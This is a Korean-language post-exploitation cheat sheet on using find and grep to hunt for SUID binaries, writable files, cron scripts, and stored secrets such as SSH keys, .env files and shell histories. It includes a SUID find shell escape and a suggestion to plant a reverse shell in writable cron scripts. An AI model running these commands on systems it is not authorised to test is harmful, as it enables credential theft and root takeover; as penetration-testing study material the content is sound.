# 04_find_로컬파일찾기

# find — 로컬 파일 찾기

쉘 획득 후 권한상승 벡터 발굴의 핵심 명령어. SUID 파일, 쓰기 가능한 파일, 비밀번호가 담긴 설정 파일 등을 탐색한다. 모든 명령에 `2>/dev/null` 을 붙여 권한 거부 에러를 제거한다.

---

## SUID / SGID 파일

SUID(Set User ID): 실행 시 파일 소유자 권한으로 동작. root 소유 SUID → root 권한으로 실행됨.

SGID(Set Group ID): 실행 시 파일 그룹 권한으로 동작.

```bash
# SUID 파일 (4000)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# root 소유 SUID만
find / -uid 0 -perm -4000 -type f 2>/dev/null

# SGID 파일 (2000)
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# SUID + SGID 동시 (6000)
find / -perm -6000 -type f 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

# 상세 정보 포함 출력
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# 정렬해서 보기
find / -perm -4000 -type f 2>/dev/null | sort
```

---

## 쓰기 가능한 파일 / 디렉터리

```bash
# 현재 사용자가 쓸 수 있는 파일
find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"

# 쓰기 가능한 디렉터리 (파일 배치 가능)
find / -writable -type d 2>/dev/null

# world-writable (누구나 쓰기 가능)
find / -perm -o+w -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# 특정 퍼미션 비트 (777, 666 등)
find / -perm -222 -type d 2>/dev/null    # 모두 쓰기 가능
find / -perm 777 -type f 2>/dev/null

# 심볼릭 링크 제외
find / -perm -2 ! -type l -ls 2>/dev/null
```

---

## 특정 사용자/그룹 소유

```bash
# 특정 사용자 소유
find / -user root -type f 2>/dev/null
find / -user www-data -type f 2>/dev/null

# 특정 그룹 소유
find / -group sudo -type f 2>/dev/null
find / -group docker -type f 2>/dev/null
find / -group adm -type f 2>/dev/null      # 로그 파일 접근 가능

# root 소유 + 쓰기 가능 (다른 사람이)
find / -user root -perm -o+w -type f 2>/dev/null
find / -user root -perm -g+w -type f 2>/dev/null

# 소유자 없는 파일 (삭제된 계정)
find / -nouser -type f 2>/dev/null
find / -nogroup -type f 2>/dev/null
```

---

## 최근 수정된 파일 (cron 추적)

```bash
# 최근 5분 내 수정된 파일
find / -mmin -5 -type f 2>/dev/null

# 최근 1시간 내
find / -mmin -60 -type f 2>/dev/null

# 최근 1일 내
find / -mtime -1 -type f 2>/dev/null

# 특정 시간대 (cron 실행 패턴 파악)
find /tmp /var/tmp /dev/shm -mmin -2 -type f 2>/dev/null
```

---

## 비밀번호 / 설정 파일

```bash
# 설정 파일 확장자
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.config" -type f 2>/dev/null
find / -name "*.cfg" -type f 2>/dev/null
find / -name "*.ini" -type f 2>/dev/null

# 환경 파일
find / -name ".env" -type f 2>/dev/null
find / -name "*.env" -type f 2>/dev/null

# 백업/오래된 파일
find / -name "*.bak" -type f 2>/dev/null
find / -name "*.old" -type f 2>/dev/null
find / -name "*.backup" -type f 2>/dev/null
find / -name "*.orig" -type f 2>/dev/null
find / -name "*.swp" -type f 2>/dev/null    # vim swap 파일
find / -name "*~" -type f 2>/dev/null       # 에디터 백업

# 웹 설정
find / -name "wp-config.php" -type f 2>/dev/null
find / -name "database.php" -type f 2>/dev/null
find / -name "config.php" -type f 2>/dev/null
find / -name "settings.py" -type f 2>/dev/null
find / -name "settings.rb" -type f 2>/dev/null
find / -name "application.yml" -type f 2>/dev/null

# 인증서/키
find / -name "*.pem" -type f 2>/dev/null
find / -name "*.key" -type f 2>/dev/null
find / -name "*.crt" -type f 2>/dev/null
find / -name "*.p12" -type f 2>/dev/null
find / -name "*.kdbx" -type f 2>/dev/null   # KeePass
find / -name "*.ovpn" -type f 2>/dev/null   # VPN 설정

# SSH 키
find / -name "id_rsa" -type f 2>/dev/null
find / -name "id_ecdsa" -type f 2>/dev/null
find / -name "id_ed25519" -type f 2>/dev/null
find / -name "authorized_keys" -type f 2>/dev/null
find / -name "known_hosts" -type f 2>/dev/null
```

---

## 내용 grep (키워드 검색)

```bash
# password 키워드
grep -rni "password" /var/www 2>/dev/null
grep -rni "password" /etc 2>/dev/null
grep -rni "passwd" /var/www 2>/dev/null

# DB 자격증명
grep -rni "DB_PASS\|DB_PASSWORD\|database_password" /var/www 2>/dev/null
grep -rni "mysql_connect\|mysqli_connect" /var/www 2>/dev/null

# API 키/토큰
grep -rni "api_key\|api_secret\|secret_key\|access_token" /var/www 2>/dev/null

# 파일에서 직접 검색
find / -type f -name "*.txt" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -type f -name "*.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

---

## History 파일

```bash
# 현재 사용자
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history
cat ~/.fish_history

# 모든 사용자 (권한 있으면)
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

# find로 모든 history 파일
find / -name ".*_history" -type f 2>/dev/null | xargs cat 2>/dev/null
find / -name ".bash_history" -type f 2>/dev/null

# 이전 명령에서 패스워드 패턴 찾기
cat ~/.bash_history | grep -i "pass\|sudo\|mysql\|ssh\|scp\|ftp"
```

---

## 실행 가능한 파일

```bash
# 현재 사용자가 실행 가능
find / -executable -type f 2>/dev/null | grep -v "/proc"

# cron에서 실행되는 스크립트
find /etc/cron* /var/spool/cron* -type f 2>/dev/null

# 홈 디렉터리의 실행 파일
find /home -executable -type f 2>/dev/null
find /opt -executable -type f 2>/dev/null
```

---

## 실전 활용

```bash
# SUID 발견 후 GTFOBins 연계
find / -perm -4000 -type f 2>/dev/null
# → https://gtfobins.github.io 검색

# find 자체에 SUID 있으면 즉시 root
find . -exec /bin/sh -p \; -quit

# 쓰기 가능한 cron 스크립트 발견 시
find /etc/cron* -writable -type f 2>/dev/null
# → 리버스쉘 페이로드 추가

# tmp에 최근 파일 (cron 실행 흔적)
find /tmp /var/tmp /dev/shm -mmin -1 -type f 2>/dev/null
```

---

## 팁

- `2>/dev/null` 필수 (에러 수천 줄 방지)
- cron 추적 시 `pspy64`와 병행 사용
- 발견한 파일은 `ls -la`, `stat`, `file` 명령으로 상세 확인
- `/tmp`, `/var/tmp`, `/dev/shm` 은 대부분 쓰기 가능 → 파일 업로드 위치로 활용
- 홈 디렉터리 숨김 파일 주의: `ls -la ~`